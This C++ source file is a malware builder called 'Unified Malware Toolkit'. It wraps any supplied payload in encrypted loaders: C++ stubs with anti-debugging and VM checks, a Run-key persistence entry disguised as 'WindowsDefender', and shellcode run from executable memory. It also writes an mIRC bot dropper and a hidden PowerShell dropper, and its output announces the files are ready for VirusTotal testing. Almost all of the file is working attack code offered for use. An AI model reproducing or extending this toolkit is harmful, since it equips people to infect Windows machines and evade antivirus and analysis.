#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <algorithm>

class UnifiedMalwareToolkit {
private:
    std::mt19937 rng;
    
    void initializeRNG() {
        auto seed = std::chrono::high_resolution_clock::now().time_since_epoch().count();
        rng.seed(seed);
    }
    
    std::string generateRandomString(size_t length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.reserve(length);
        
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
        for (size_t i = 0; i < length; i++) {
            result += charset[dist(rng)];
        }
        return result;
    }
    
    // AES S-box for encryption
    static const uint8_t sbox[256];
    
    // XOR encryption with rolling key
    std::vector<uint8_t> xorEncrypt(const std::vector<uint8_t>& data, uint8_t key) {
        std::vector<uint8_t> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= key + (i % 256);
            key = (key << 1) | (key >> 7); // Rotate key
        }
        return encrypted;
    }
    
    // ChaCha20-style encryption (simplified)
    std::vector<uint8_t> chachaEncrypt(const std::vector<uint8_t>& data) {
        std::vector<uint8_t> encrypted = data;
        uint32_t key[8] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
                          rng(), rng(), rng(), rng()};
        
        for (size_t i = 0; i < encrypted.size(); i += 4) {
            uint32_t keystream = key[i % 8] ^ rng();
            for (size_t j = 0; j < 4 && i + j < encrypted.size(); j++) {
                encrypted[i + j] ^= (keystream >> (j * 8)) & 0xFF;
            }
        }
        return encrypted;
    }
    
    std::string bytesToHex(const std::vector<uint8_t>& bytes) {
        std::stringstream ss;
        for (size_t i = 0; i < bytes.size(); i++) {
            if (i % 16 == 0) ss << "\n        ";
            ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)bytes[i];
            if (i < bytes.size() - 1) ss << ", ";
        }
        return ss.str();
    }
    
public:
    UnifiedMalwareToolkit() {
        initializeRNG();
    }
    
    // Generate MIRC script dropper
    std::string generateMIRCDropper(const std::vector<uint8_t>& payload) {
        std::string scriptName = "bot_" + generateRandomString(6) + ".mrc";
        std::string channelName = "#" + generateRandomString(8);
        
        std::stringstream mirc;
        mirc << "; MIRC Bot Script - " << scriptName << "\n";
        mirc << "on *:TEXT:!drop*:" << channelName << ": {\n";
        mirc << "  if ($nick == $me) { halt }\n";
        mirc << "  var %payload = ";
        
        // Encode payload as hex string
        std::vector<uint8_t> encrypted = xorEncrypt(payload, 0xAA);
        for (size_t i = 0; i < encrypted.size(); i++) {
            mirc << std::hex << std::setw(2) << std::setfill('0') << (int)encrypted[i];
        }
        
        mirc << "\n";
        mirc << "  var %decoded = $decode_payload(%payload)\n";
        mirc << "  var %tempfile = $mircdir $+ temp_ $+ $rand(1000,9999) $+ .exe\n";
        mirc << "  bwrite %tempfile 1 %decoded\n";
        mirc << "  run %tempfile\n";
        mirc << "  .timer 1 5 remove %tempfile\n";
        mirc << "}\n\n";
        
        mirc << "alias decode_payload {\n";
        mirc << "  var %result, %i = 1\n";
        mirc << "  while (%i <= $len($1)) {\n";
        mirc << "    var %byte = $base($mid($1, %i, 2), 16, 10)\n";
        mirc << "    %byte = $calc(%byte $xor (170 + ((%i / 2 - 1) % 256)))\n";
        mirc << "    %result = %result $+ $chr(%byte)\n";
        mirc << "    inc %i 2\n";
        mirc << "  }\n";
        mirc << "  return %result\n";
        mirc << "}\n\n";
        
        mirc << "on *:CONNECT: {\n";
        mirc << "  .timer 1 3 join " << channelName << "\n";
        mirc << "  echo -a Bot connected to " << channelName << "\n";
        mirc << "}\n";
        
        return mirc.str();
    }
    
    // Generate C++ stub with multiple evasion techniques
    std::string generateAdvancedStub(const std::vector<uint8_t>& payload, const std::string& type = "standalone") {
        std::string funcPrefix = "fn" + generateRandomString(6);
        std::string payloadVar = "data" + generateRandomString(4);
        std::string keyVar = "key" + generateRandomString(3);
        
        std::vector<uint8_t> encrypted;
        uint8_t xorKey = 0xAA + (rng() % 100);
        
        if (type == "chacha") {
            encrypted = chachaEncrypt(payload);
        } else {
            encrypted = xorEncrypt(payload, xorKey);
        }
        
        std::stringstream stub;
        
        // Headers and includes
        stub << "#include <windows.h>\n";
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <thread>\n";
        stub << "#include <chrono>\n";
        stub << "#include <random>\n";
        stub << "#include <wininet.h>\n\n";
        stub << "#pragma comment(lib, \"wininet.lib\")\n\n";
        
        // Anti-analysis functions
        stub << "bool " << funcPrefix << "_checkEnv() {\n";
        stub << "    // Anti-debugging\n";
        stub << "    if (IsDebuggerPresent()) return false;\n";
        stub << "    \n";
        stub << "    BOOL remoteDebugger = FALSE;\n";
        stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);\n";
        stub << "    if (remoteDebugger) return false;\n";
        stub << "    \n";
        stub << "    // VM detection via timing\n";
        stub << "    DWORD start = GetTickCount();\n";
        stub << "    Sleep(100);\n";
        stub << "    if (GetTickCount() - start > 200) return false;\n";
        stub << "    \n";
        stub << "    // Check for analysis tools\n";
        stub << "    HWND hwnd = FindWindow(\"OLLYDBG\", NULL);\n";
        stub << "    if (hwnd) return false;\n";
        stub << "    hwnd = FindWindow(\"WinDbgFrameClass\", NULL);\n";
        stub << "    if (hwnd) return false;\n";
        stub << "    \n";
        stub << "    return true;\n";
        stub << "}\n\n";
        
        // Network checking function
        stub << "bool " << funcPrefix << "_checkNet() {\n";
        stub << "    HINTERNET hInternet = InternetOpen(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n";
        stub << "    if (!hInternet) return false;\n";
        stub << "    \n";
        stub << "    HINTERNET hConnect = InternetOpenUrl(hInternet, \"http://www.google.com\", NULL, 0, 0, 0);\n";
        stub << "    bool connected = (hConnect != NULL);\n";
        stub << "    \n";
        stub << "    if (hConnect) InternetCloseHandle(hConnect);\n";
        stub << "    InternetCloseHandle(hInternet);\n";
        stub << "    return connected;\n";
        stub << "}\n\n";
        
        // Decryption function
        if (type == "chacha") {
            stub << "void " << funcPrefix << "_decrypt(unsigned char* data, size_t size) {\n";
            stub << "    unsigned int key[8] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,\n";
            stub << "                          0x" << std::hex << rng() << ", 0x" << rng() << ", 0x" << rng() << ", 0x" << rng() << "};\n";
            stub << "    \n";
            stub << "    for (size_t i = 0; i < size; i += 4) {\n";
            stub << "        unsigned int keystream = key[i % 8] ^ (i * 0x9E3779B9);\n";
            stub << "        for (size_t j = 0; j < 4 && i + j < size; j++) {\n";
            stub << "            data[i + j] ^= (keystream >> (j * 8)) & 0xFF;\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "}\n\n";
        } else {
            stub << "void " << funcPrefix << "_decrypt(unsigned char* data, size_t size, unsigned char key) {\n";
            stub << "    for (size_t i = 0; i < size; i++) {\n";
            stub << "        data[i] ^= key + (i % 256);\n";
            stub << "        key = (key << 1) | (key >> 7);\n";
            stub << "    }\n";
            stub << "}\n\n";
        }
        
        // Persistence function
        stub << "void " << funcPrefix << "_persist() {\n";
        stub << "    HKEY hKey;\n";
        stub << "    char path[MAX_PATH];\n";
        stub << "    GetModuleFileName(NULL, path, MAX_PATH);\n";
        stub << "    \n";
        stub << "    if (RegOpenKeyEx(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {\n";
        stub << "        RegSetValueEx(hKey, \"WindowsDefender\", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);\n";
        stub << "        RegCloseKey(hKey);\n";
        stub << "    }\n";
        stub << "}\n\n";
        
        // Main payload data
        stub << "// Encrypted payload (" << payload.size() << " bytes)\n";
        stub << "unsigned char " << payloadVar << "[] = {" << bytesToHex(encrypted) << "\n};\n";
        if (type != "chacha") {
            stub << "const unsigned char " << keyVar << " = 0x" << std::hex << (int)xorKey << ";\n";
        }
        stub << "const size_t PAYLOAD_SIZE = " << std::dec << encrypted.size() << ";\n\n";
        
        // Main function
        stub << "int main() {\n";
        stub << "    // Environment checks\n";
        stub << "    if (!" << funcPrefix << "_checkEnv()) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "    \n";
        stub << "    // Random delay\n";
        stub << "    std::random_device rd;\n";
        stub << "    std::mt19937 gen(rd());\n";
        stub << "    std::uniform_int_distribution<> dis(2000, 5000);\n";
        stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));\n";
        stub << "    \n";
        stub << "    // Network connectivity check\n";
        stub << "    if (!" << funcPrefix << "_checkNet()) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "    \n";
        stub << "    // Establish persistence\n";
        stub << "    " << funcPrefix << "_persist();\n";
        stub << "    \n";
        stub << "    // Single instance mutex\n";
        stub << "    HANDLE hMutex = CreateMutex(NULL, TRUE, \"Global\\\\WinDefenderMutex\");\n";
        stub << "    if (GetLastError() == ERROR_ALREADY_EXISTS) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "    \n";
        stub << "    // Allocate executable memory\n";
        stub << "    LPVOID execMem = VirtualAlloc(NULL, PAYLOAD_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
        stub << "    if (!execMem) {\n";
        stub << "        return 1;\n";
        stub << "    }\n";
        stub << "    \n";
        stub << "    // Copy and decrypt payload\n";
        stub << "    memcpy(execMem, " << payloadVar << ", PAYLOAD_SIZE);\n";
        if (type == "chacha") {
            stub << "    " << funcPrefix << "_decrypt((unsigned char*)execMem, PAYLOAD_SIZE);\n";
        } else {
            stub << "    " << funcPrefix << "_decrypt((unsigned char*)execMem, PAYLOAD_SIZE, " << keyVar << ");\n";
        }
        stub << "    \n";
        stub << "    // Execute payload\n";
        stub << "    ((void(*)())execMem)();\n";
        stub << "    \n";
        stub << "    // Cleanup\n";
        stub << "    VirtualFree(execMem, 0, MEM_RELEASE);\n";
        stub << "    if (hMutex) CloseHandle(hMutex);\n";
        stub << "    \n";
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Generate PowerShell dropper
    std::string generatePowerShellDropper(const std::vector<uint8_t>& payload) {
        std::vector<uint8_t> encrypted = xorEncrypt(payload, 0xBB);
        
        std::stringstream ps;
        ps << "# PowerShell Dropper Script\n";
        ps << "$ErrorActionPreference = 'SilentlyContinue'\n\n";
        
        ps << "function Decrypt-Payload {\n";
        ps << "    param([string]$hexData)\n";
        ps << "    $bytes = [byte[]]::new($hexData.Length / 2)\n";
        ps << "    for ($i = 0; $i -lt $hexData.Length; $i += 2) {\n";
        ps << "        $byte = [Convert]::ToByte($hexData.Substring($i, 2), 16)\n";
        ps << "        $key = (187 + ($i / 2) % 256) % 256\n";
        ps << "        $bytes[$i / 2] = $byte -bxor $key\n";
        ps << "    }\n";
        ps << "    return $bytes\n";
        ps << "}\n\n";
        
        ps << "$payload = '";
        for (size_t i = 0; i < encrypted.size(); i++) {
            ps << std::hex << std::setw(2) << std::setfill('0') << (int)encrypted[i];
        }
        ps << "'\n\n";
        
        ps << "$decrypted = Decrypt-Payload -hexData $payload\n";
        ps << "$tempFile = [System.IO.Path]::GetTempFileName() + '.exe'\n";
        ps << "[System.IO.File]::WriteAllBytes($tempFile, $decrypted)\n";
        ps << "Start-Process -FilePath $tempFile -WindowStyle Hidden\n";
        ps << "Start-Sleep -Seconds 3\n";
        ps << "Remove-Item -Path $tempFile -Force\n";
        
        return ps.str();
    }
    
    // Create test payload
    std::vector<uint8_t> createTestPayload() {
        // Simple test payload (NOP sled + message)
        std::vector<uint8_t> payload = {
            // "Hello Malware!" string
            0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x4d, 0x61, 0x6c, 0x77, 0x61, 0x72, 0x65, 0x21,
            // NOP sled
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            // INT3 breakpoints for testing
            0xCC, 0xCC, 0xCC, 0xCC
        };
        return payload;
    }
    
    bool saveToFile(const std::string& content, const std::string& filename) {
        std::ofstream file(filename);
        if (!file.is_open()) {
            return false;
        }
        file << content;
        file.close();
        return true;
    }
    
    void generateAllFormats(const std::vector<uint8_t>& payload) {
        std::cout << "========================================\n";
        std::cout << "  Unified Malware Toolkit v3.0\n";
        std::cout << "========================================\n\n";
        
        std::cout << "[*] Generating all malware formats...\n\n";
        
        // Generate C++ stubs
        std::cout << "[+] Generating XOR encrypted C++ stub...\n";
        std::string xorStub = generateAdvancedStub(payload, "xor");
        saveToFile(xorStub, "xor_encrypted_stub.cpp");
        
        std::cout << "[+] Generating ChaCha encrypted C++ stub...\n";
        std::string chachaStub = generateAdvancedStub(payload, "chacha");
        saveToFile(chachaStub, "chacha_encrypted_stub.cpp");
        
        // Generate MIRC dropper
        std::cout << "[+] Generating MIRC bot dropper...\n";
        std::string mircDropper = generateMIRCDropper(payload);
        saveToFile(mircDropper, "mirc_bot_dropper.mrc");
        
        // Generate PowerShell dropper
        std::cout << "[+] Generating PowerShell dropper...\n";
        std::string psDropper = generatePowerShellDropper(payload);
        saveToFile(psDropper, "powershell_dropper.ps1");
        
        std::cout << "\n[*] Generation complete!\n\n";
        std::cout << "Generated files:\n";
        std::cout << "  - xor_encrypted_stub.cpp (XOR encryption)\n";
        std::cout << "  - chacha_encrypted_stub.cpp (ChaCha20-style encryption)\n";
        std::cout << "  - mirc_bot_dropper.mrc (MIRC script dropper)\n";
        std::cout << "  - powershell_dropper.ps1 (PowerShell dropper)\n\n";
        
        std::cout << "Compilation commands:\n";
        std::cout << "  g++ -o xor_stub.exe xor_encrypted_stub.cpp -lwininet -static\n";
        std::cout << "  g++ -o chacha_stub.exe chacha_encrypted_stub.cpp -lwininet -static\n\n";
        
        std::cout << "Features in each stub:\n";
        std::cout << "  ✓ Anti-debugging detection\n";
        std::cout << "  ✓ VM timing analysis\n";
        std::cout << "  ✓ Analysis tool detection\n";
        std::cout << "  ✓ Network connectivity check\n";
        std::cout << "  ✓ Registry persistence\n";
        std::cout << "  ✓ Mutex single instance\n";
        std::cout << "  ✓ Memory execution (RWX)\n";
        std::cout << "  ✓ Multiple encryption options\n\n";
        
        std::cout << "Ready for VirusTotal testing!\n";
        std::cout << "========================================\n";
    }
};

// AES S-box definition
const uint8_t UnifiedMalwareToolkit::sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

int main(int argc, char* argv[]) {
    UnifiedMalwareToolkit toolkit;
    
    std::vector<uint8_t> payload;
    
    if (argc > 1) {
        // Load payload from file
        std::ifstream file(argv[1], std::ios::binary);
        if (file.is_open()) {
            file.seekg(0, std::ios::end);
            size_t size = file.tellg();
            file.seekg(0, std::ios::beg);
            
            payload.resize(size);
            file.read(reinterpret_cast<char*>(payload.data()), size);
            file.close();
            
            std::cout << "Loaded payload from " << argv[1] << " (" << size << " bytes)\n\n";
        } else {
            std::cout << "Failed to load payload file, using test payload\n\n";
            payload = toolkit.createTestPayload();
        }
    } else {
        std::cout << "No payload file specified, using test payload\n\n";
        payload = toolkit.createTestPayload();
    }
    
    toolkit.generateAllFormats(payload);
    
    return 0;
}